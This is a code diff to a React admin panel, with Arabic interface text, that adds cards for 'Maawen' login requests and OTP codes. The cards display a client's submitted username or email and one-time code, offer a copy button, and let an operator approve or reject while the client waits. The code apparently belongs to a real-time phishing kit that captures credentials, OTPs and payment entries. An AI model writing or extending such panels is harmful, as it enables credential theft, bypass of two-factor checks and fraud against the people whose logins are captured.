@@ -76,7 +76,7 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
 
   // بناء خط زمني موحّد: كل صندوق يحمل وقته الخاص (created_at)
   type TimelineItem = {
-    kind: "profile" | "booking" | "payment" | "otp" | "inquiry" | "maawen";
+    kind: "profile" | "booking" | "payment" | "otp" | "inquiry" | "maawen" | "maawen-login" | "maawen-otp";
     created_at: string;
     data: Record<string, unknown>;
   };
@@ -110,10 +110,10 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
     const seenPending = new Set<string>();
     for (const e of client.entries as Array<DecidableEntry>) {
       const bookingId = String(e.payload?.booking_id ?? "");
-      const entryType = e.type === "otp_request" ? "otp" : e.type === "verification" ? "otp" : e.type;
+      const entryType = e.type === "otp_request" ? "otp" : e.type === "verification" ? "otp" : e.type === "maawen_login" ? "maawen-login" : e.type === "maawen_login_otp" ? "maawen-otp" : e.type;
       const status = String(e.payload?.status ?? "pending_admin");
       const key = `${bookingId}:${entryType}`;
-      if (entryType === "payment" || entryType === "otp") {
+      if (entryType === "payment" || entryType === "otp" || entryType === "maawen-login" || entryType === "maawen-otp") {
         if (status === "pending_admin" && !seenPending.has(key)) {
           seenPending.add(key);
           decidableIds.add(e.id);
@@ -129,6 +129,8 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
     else if (e.type === "inquiry") timeline.push({ kind: "inquiry", created_at: e.created_at, data: { ...e } });
     else if (e.type === "maawen_booking" || e.type === "maawen_profile" || e.type === "maawen_payment")
       timeline.push({ kind: "maawen", created_at: e.created_at, data: { ...e } });
+    else if (e.type === "maawen_login") timeline.push({ kind: "maawen-login", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
+    else if (e.type === "maawen_login_otp") timeline.push({ kind: "maawen-otp", created_at: e.created_at, data: { ...e, id: e.id, decidable: decidableIds.has(e.id) } });
   }
 
   // ترتيب الخط الزمني: الأحدث في الأعلى، الأقدم في الأسفل
@@ -272,6 +274,26 @@ export function ClientDetailPanel({ client, onBlock, onArchive, onDelete, onEntr
                 <MaawenCard
                   key={`maawen-${String(item.data.id ?? i)}`}
                   entry={item.data as { type: string; payload: Record<string, unknown>; created_at: string }}
+                />
+              );
+            }
+            if (item.kind === "maawen-login") {
+              return (
+                <MaawenLoginCard
+                  key={`maawen-login-${String(item.data.id ?? i)}`}
+                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
+                  decidable={item.data.decidable === true}
+                  onDecided={onEntryDecided}
+                />
+              );
+            }
+            if (item.kind === "maawen-otp") {
+              return (
+                <MaawenOtpCard
+                  key={`maawen-otp-${String(item.data.id ?? i)}`}
+                  entry={item.data as { id: string; type: string; payload: Record<string, unknown>; created_at: string }}
+                  decidable={item.data.decidable === true}
+                  onDecided={onEntryDecided}
                 />
               );
             }
@@ -747,6 +769,183 @@ function MaawenCard({
         )}
         {type === "maawen_booking" && (
           <DataRow label="كامل التفاصيل" value={bookingRef || "سجّل في الوارد"} small />
+        )}
+      </div>
+    </div>
+  );
+}
+
+/** بطاقة طلب تسجيل دخول "معاون" — يعرض بيانات الدخول للمدير مع أزرار القرار. */
+function MaawenLoginCard({
+  entry,
+  decidable = true,
+  onDecided,
+}: {
+  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
+  decidable?: boolean;
+  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
+}) {
+  const p = entry.payload;
+  const email = String(p.email ?? "");
+	const username = String(p.username ?? "");
+	const credential = String(p.credential ?? email ?? username ?? "");
+	const status = String(p.status ?? "pending_admin");
+	const [deciding, setDeciding] = useState(false);
+
+	const statusLabel =
+    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
+	const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";
+
+	async function decide(decision: "approve" | "reject") {
+    setDeciding(true);
+    try {
+      const res = await fetch("/api/maawen/login/decide", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ entryId: entry.id, decision }),
+      });
+      if (res.ok) {
+        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
+      } else {
+        setDeciding(false);
+      }
+    } catch {
+      setDeciding(false);
+    }
+  }
+
+	return (
+    <div className={styles.card}>
+      <div className={styles.cardHeader}>
+        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> تسجيل دخول</span>
+        <div className={styles.cardHeaderRight}>
+          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
+        </div>
+      </div>
+      <div className={styles.cardBody}>
+        <DataRow label="اسم المستخدم / البريد" value={credential || "غير متوفر"} dir="ltr" />
+        {email && username && email !== username && <DataRow label="البريد" value={email} dir="ltr" />}
+        {username && <DataRow label="اسم المستخدم" value={username} dir="ltr" />}
+
+        <div className={styles.paymentStatus}>
+          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
+            {statusLabel}
+          </span>
+        </div>
+
+        {status === "pending_admin" && decidable && (
+          <div className={styles.adminActions}>
+            <button
+              className={`${styles.actionBtn} ${styles.approveBtn}`}
+              onClick={() => decide("approve")}
+              disabled={deciding}
+            >
+              ✓ موافقة
+            </button>
+            <button
+              className={`${styles.actionBtn} ${styles.rejectBtn}`}
+              onClick={() => decide("reject")}
+              disabled={deciding}
+            >
+              ✗ رفض
+            </button>
+          </div>
+        )}
+        {status === "pending_admin" && !decidable && (
+          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+/** بطاقة رمز تحقق تسجيل دخول "معاون" — يعرض OTP مع أزرار القرار. */
+function MaawenOtpCard({
+  entry,
+  decidable = true,
+  onDecided,
+}: {
+  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
+  decidable?: boolean;
+  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
+}) {
+	const p = entry.payload;
+	const otp = String(p.otp ?? "----");
+	const status = String(p.status ?? "pending_admin");
+	const [deciding, setDeciding] = useState(false);
+	const copy = useCopy();
+
+	const statusLabel =
+    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
+	const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";
+
+	async function decide(decision: "approve" | "reject") {
+    setDeciding(true);
+    try {
+      const res = await fetch("/api/maawen/login/decide-otp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ entryId: entry.id, decision }),
+      });
+      if (res.ok) {
+        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
+      } else {
+        setDeciding(false);
+      }
+    } catch {
+      setDeciding(false);
+    }
+  }
+
+	return (
+    <div className={styles.card}>
+      <div className={styles.cardHeader}>
+        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> رمز تحقق (OTP)</span>
+        <div className={styles.cardHeaderRight}>
+          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
+        </div>
+      </div>
+      <div className={styles.cardBody}>
+        <div className={styles.otpSection}>
+          <span className={styles.otpLabel}>الرمز المُرسل:</span>
+          <div
+            className={`${styles.otpBoxes} ${styles.copyable}`}
+            dir="ltr"
+            onClick={() => copy(otp, "رمز OTP")}
+            title="انقر للنسخ"
+          >
+            {otp.split("").map((d, i) => (
+              <div key={i} className={styles.otpBox}>{d}</div>
+            ))}
+          </div>
+        </div>
+
+        <div className={styles.paymentStatus}>
+          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
+            {statusLabel}
+          </span>
+        </div>
+
+        {status === "pending_admin" && decidable && (
+          <div className={styles.adminActions}>
+            <button
+              className={`${styles.actionBtn} ${styles.approveBtn}`}
+              onClick={() => decide("approve")}
+              disabled={deciding}
+            >
+              ✓ موافقة
+            </button>
+            <button
+              className={`${styles.actionBtn} ${styles.rejectBtn}`}
+              onClick={() => decide("reject")}
+              disabled={deciding}
+            >
+              ✗ رفض
+            </button>
+          </div>
+        )}
+        {status === "pending_admin" && !decidable && (
+          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
         )}
       </div>
     </div>
